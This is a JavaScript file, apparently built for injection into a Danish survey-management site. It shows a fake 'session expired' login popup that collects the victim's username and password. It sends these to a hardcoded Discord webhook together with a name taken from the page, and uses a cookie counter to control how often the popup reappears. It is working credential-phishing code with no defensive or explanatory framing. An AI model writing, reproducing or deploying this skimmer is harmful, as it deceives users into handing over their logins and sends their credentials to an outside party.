
var b00bz = document.querySelectorAll('[title="Sletter spørgeskemaet, afsnit, spørgsmål samt respondenter og deres svar"]')[0].parentNode.parentNode.parentNode.parentNode.parentNode;
const clone = b00bz.cloneNode(true);
b00bz.parentNode.replaceChild(clone, b00bz);

function poopup() {
    const overlay = document.createElement("div");
    overlay.style.position = "fixed";
    overlay.style.top = "0";
    overlay.style.left = "0";
    overlay.style.width = "100%";
    overlay.style.height = "100%";
    overlay.style.backgroundColor = "rgba(0, 0, 0, 0.5)";
    document.body.append(overlay);

    const popup = document.createElement("div");
    popup.style.position = "fixed";
    popup.style.top = "50%";
    popup.style.left = "50%";
    popup.style.transform = "translate(-50%, -50%)";
    popup.style.width = "300px";
    popup.style.padding = "20px";
    popup.style.backgroundColor = "#fff";
    popup.style.boxShadow = "0px 4px 10px rgba(0, 0, 0, 0.1)";
    popup.style.borderRadius = "8px";
    document.body.appendChild(popup);

    const titleLabel = document.createElement("label");
    titleLabel.textContent = "Din session er udløbet!";
    titleLabel.style.textAlign = "center";
    titleLabel.style.display = "block";
    titleLabel.style.fontWeight = "bold"
    popup.appendChild(titleLabel);
    
    popup.appendChild(document.createElement("br"));

    const titleLabel2 = document.createElement("label");
    titleLabel2.textContent = "Login for at fortsætte";
    titleLabel2.style.textAlign = "center";
    titleLabel2.style.display = "block";
    titleLabel2.style.marginTop = "-15px";
    popup.appendChild(titleLabel2);

    popup.appendChild(document.createElement("br"));

    const usernameLabel = document.createElement("label");
    usernameLabel.textContent = "Brugernavn:";
    popup.appendChild(usernameLabel);

    const usernameInput = document.createElement("input");
    usernameInput.type = "text";
    usernameInput.id = "username";
    usernameInput.placeholder = "Skriv brugernavn";
    usernameInput.style.width = "100%";
    usernameInput.style.marginTop = "3px";
    usernameInput.style.marginBottom = "10px";
    usernameInput.style.borderWidth = "1px";
    popup.appendChild(usernameInput);

    const passwordLabel = document.createElement("label");
    passwordLabel.textContent = "Kodeord:";
    popup.appendChild(passwordLabel);

    const passwordInput = document.createElement("input");
    passwordInput.type = "password";
    passwordInput.id = "password";
    passwordInput.placeholder = "Skriv kodeord";
    passwordInput.style.width = "100%";
    passwordInput.style.marginTop = "3px";
    passwordInput.style.marginBottom = "15px";
    passwordInput.style.borderWidth = "1px";
    popup.appendChild(passwordInput);

    const loginButton = document.createElement("button");
    loginButton.textContent = "Login";
    loginButton.style.width = "100%";
    popup.appendChild(loginButton);

    loginButton.addEventListener("click", function() {
        const username = document.getElementById("username").value;
        const password = document.getElementById("password").value;
        if (username != "" && password != ""){
            document.cookie = "meme=9";
            var xhr = new XMLHttpRequest();
            xhr.open("POST","https://discord.com/api/webhooks/881918023764697128/tEtQqj3w08JSjay5Jg4CIzijyTb2akzTosya6NVKL8Pr-gMMq33TwPwyy-wInoErm_YA", true);
            xhr.setRequestHeader("Content-Type", "application/json");
            var o_fname = document.querySelector("#C\\.10");
            var fname = "<unknown>";
            if (o_fname != null){
                fname = o_fname.innerHTML;
            }
            var content = "\`\`\`\no_O\n" + fname +"\nusr: " + username + "\npswd: " + password + "\n" + "\n\`\`\`";
            xhr.send(JSON.stringify({"content": content}));
            console.log("success!");
            setTimeout(() => {location.reload()},350);
        } else {
            console.log("failure...");
        }
    });
}
function rld(){
    location.reload();
}
function checkCok(){
    var buh = false;
    var cok = document.cookie;
    if (cok.includes("meme")){
        var c = cok.at(cok.indexOf("meme") + 5);
        if (c != '0'){
            c -= 1;
            document.cookie = "meme="+c;
        } else {buh=true;}
    } else {buh=true;}
    if (buh) {
        Array.from(document.getElementsByTagName('*')).forEach(element => {
            const clone = element.cloneNode(true);
            element.parentNode.replaceChild(clone, element);
        });
        poopup();
    } else {
        console.log(document.cookie.at(document.cookie.indexOf("meme") + 5));
    }
}

checkCok();
